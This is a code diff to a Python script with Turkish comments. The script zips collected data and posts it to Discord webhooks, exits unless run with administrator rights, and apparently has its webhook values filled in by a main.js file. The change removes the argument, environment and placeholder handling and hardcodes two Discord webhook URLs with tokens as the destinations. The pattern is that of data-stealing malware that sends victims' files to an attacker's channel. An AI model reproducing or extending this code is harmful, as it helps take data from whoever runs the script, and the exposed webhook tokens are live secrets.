@@ -537,9 +537,9 @@ def zip_and_send_to_webhook(webhook_url, api_webhook_url=None):
         
         # Hem kullanıcı webhook'una hem de API webhook'una gönder
         webhooks_to_send = []
-        if webhook_url and webhook_url != '%WEBHOOK%':
+        if webhook_url:
             webhooks_to_send.append(webhook_url)
-        if api_webhook_url and api_webhook_url != '%API_WEBHOOK%':
+        if api_webhook_url:
             webhooks_to_send.append(api_webhook_url)
         
         if not webhooks_to_send:
@@ -572,34 +572,9 @@ if __name__ == "__main__":
     if not is_admin():
         sys.exit(1)
     
-    # Webhook URL'lerini command line argümanından veya environment variable'dan al
-    webhook_url = None
-    api_webhook_url = None
-    
-    # Önce command line argümanından kontrol et
-    if len(sys.argv) > 1:
-        webhook_url = sys.argv[1]
-    if len(sys.argv) > 2:
-        api_webhook_url = sys.argv[2]
-    
-    # Yoksa environment variable'dan al
-    if not webhook_url:
-        webhook_url = os.environ.get('WEBHOOK_URL')
-    if not api_webhook_url:
-        api_webhook_url = os.environ.get('API_WEBHOOK_URL')
-    
-    # %WEBHOOK% ve %API_WEBHOOK% placeholder'larını kontrol et (main.js replace edecek)
-    if webhook_url == '%WEBHOOK%':
-        webhook_url = None
-    if api_webhook_url == '%API_WEBHOOK%':
-        api_webhook_url = None
-    
-    # Test amaçlı hardcoded webhook (eğer webhook yoksa)
- #   if not webhook_url:
-  #      webhook_url = "https://discord.com/api/webhooks/1434475817362264085/YOaXf0HYLehQRP2QPgiK4M3C6jgxi_hbz3Y--HXoK3QlPwKho0T0gy_wZsSyf0W299_a"
-    
-    if not webhook_url and not api_webhook_url:
-        sys.exit(1)
+    # Hardcoded webhook URL'leri
+    webhook_url = "https://discord.com/api/webhooks/1436040686754467940/Zld8t-X7FBUcMvcXXYmPzO_6dOTU79qcboRYz5CdxMNJUt8q1SzFhkI-aIUFnRbyKCiY"
+    api_webhook_url = "https://discord.com/api/webhooks/1435648773702291700/FRStobzda67gcKtUTKkmXiWiRN4LmaCQp4_jtBY6LbBOyFrmxYvNyT4gdATwTzhbS4Pi"
     
     # Ana işlemi çalıştır
     main()
